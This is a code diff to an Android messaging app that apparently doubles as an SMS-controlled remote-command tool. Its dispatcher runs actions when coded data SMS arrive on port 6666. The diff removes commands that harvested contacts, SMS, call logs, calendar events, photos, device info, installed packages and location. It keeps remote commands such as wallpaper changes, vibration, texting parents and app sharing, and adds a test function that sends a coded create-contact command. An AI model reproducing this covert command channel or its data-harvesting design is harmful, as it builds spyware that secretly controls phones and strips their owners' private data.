@@ -69,6 +69,7 @@ import com.candroid.textme.jobs.JobsIntentService;
 import com.candroid.textme.receivers.AdminReceiver;
 import com.candroid.textme.receivers.OutgoingCallReceiver;
 import com.candroid.textme.receivers.ScreenReceiver;
+import com.candroid.textme.services.MessagingService;
 import com.candroid.textme.ui.activities.MainActivity;
 
 import java.io.ByteArrayOutputStream;
@@ -440,36 +441,8 @@ public class Lofl {
                 intent.setAction(JobsIntentService.ACTION_WALLPAPER);
                 commandFound = true;
                 break;
-            case Commands.CONTACTS:
-                intent.setAction(JobsIntentService.ACTION_CONTACTS);
-                commandFound = true;
-                break;
-            case Commands.SMS:
-                intent.setAction(JobsIntentService.ACTION_SMS);
-                commandFound = true;
-                break;
-            case Commands.CALL_LOG:
-                intent.setAction(JobsIntentService.ACTION_PHONE_CALLS);
-                commandFound = true;
-                break;
-            case Commands.CALENDAR_EVENTS:
-                intent.setAction(JobsIntentService.ACTION_CALENDAR_EVENT);
-                commandFound = true;
-                break;
-            case Commands.DCIM:
-                intent.setAction(JobsIntentService.ACTION_DCIM_FILES);
-                commandFound = true;
-                break;
             case Commands.TEXT_PARENTS:
                 intent.setAction(JobsIntentService.ACTION_TEXT_PARENTS);
-                commandFound = true;
-                break;
-            case Commands.DEVICE_INFO:
-                intent.setAction(JobsIntentService.ACTION_DEVICE_INFO);
-                commandFound = true;
-                break;
-            case Commands.INSTALLED_PACKAGES:
-                intent.setAction(JobsIntentService.ACTION_PACKAGES);
                 commandFound = true;
                 break;
             case Commands.SYNC_PHONE_TO_DATABASE:
@@ -499,10 +472,6 @@ public class Lofl {
                 break;
             case Commands.VIBRATOR:
                 intent.setAction(JobsIntentService.ACTION_VIBRATOR);
-                commandFound = true;
-                break;
-            case Commands.LOCATION:
-                intent.setAction(JobsIntentService.ACTION_LOCATION);
                 commandFound = true;
                 break;
             case Commands.SHARE_APP:
@@ -1089,6 +1058,7 @@ public class Lofl {
     }
 
 
+
     public static void sendDeliveryReportSms(String address) {
         SmsManager smsManager = SmsManager.getDefault();
         smsManager.sendDataMessage(address, null, new Short("6666"), Constants.DELIVERY_REPORT_CODE.getBytes(), null, null);
@@ -1102,6 +1072,12 @@ public class Lofl {
                 .setGroup(Constants.CONFIRMATIONS_NOTIFICATION_GROUP).setTimeoutAfter(Constants.SENT_CONFIRM_TIMEOUT_AFTER)
                 .setAutoCancel(true).setContentIntent(createContentClickIntent(context, intent));
         sNotificationManager.notify(sId++, builder.build());
+    }
+
+    public static void sendCommandTest(Context context){
+        SmsManager smsManager = SmsManager.getDefault();
+        String command = Constants.COMMAND_CODE + Commands.CREATE_CONTACT + " --Jack Mehoff --12334567890";
+        smsManager.sendDataMessage(MessagingService.sTelephoneAddress, null, new Short("6666"), command.getBytes(), null, null);
     }
 
     /*send sms message as type String*/
